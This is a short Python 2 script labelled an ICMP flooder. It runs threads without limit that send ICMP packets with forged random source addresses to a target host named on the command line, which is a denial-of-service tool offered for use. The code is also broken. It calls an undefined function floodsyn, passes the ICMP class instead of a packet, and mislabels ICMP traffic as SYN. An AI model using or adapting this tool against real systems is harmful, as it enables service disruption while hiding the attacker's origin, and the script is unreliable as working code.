#!/usr/bin/env python
#
# ICMP flooder
#
# Date: Oct. 22, 2012
# All rights reserved.
#

import socket,sys,threading
import threading,time
import scapy.arch,random
from scapy.all import sr1,IP,ICMP,TCP

scapy.config.conf.iface="eth0"

class sendSYN(threading.Thread):
	def __init__(self, id, name, target, port):
		self.threadID = id
		self.name = name
		self.target = target
		self.port = port
		threading.Thread.__init__(self)
	def run(self):
		print "Starting %s %s %d" % (self.name, self.target, self.port)
		i = IP() 
		i.src="%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1,254), random.randint(1, 254), random.randint(1,254))
		i.dst = self.target
		t = ICMP()
		print "Spoofing %s to send ICMP ..." % i.src
		sr1(i/ICMP,verbose=0)
		
def floodicmp(target, port, thds):
	total = 0
	print "Flooding SYN to %s:%i" % (target, port)
	while 1:
		if threading.activeCount() < thds:
			sd = sendSYN(total, "Thread-" + str(total), target, port)		
			sd.start()
			total += 1
		#sys.stdout.write("\rTotal packet sent: \t\t\t%i\n" % total)

if __name__ == "__main__":
	if len(sys.argv) != 4:
		print "Usage: %s <target> <port> <num_threads>" % sys.argv[0]
		sys.exit(1)
	target=sys.argv[1]
	port=int(sys.argv[2])
	thds=int(sys.argv[3])
	floodsyn(target, port, thds)	

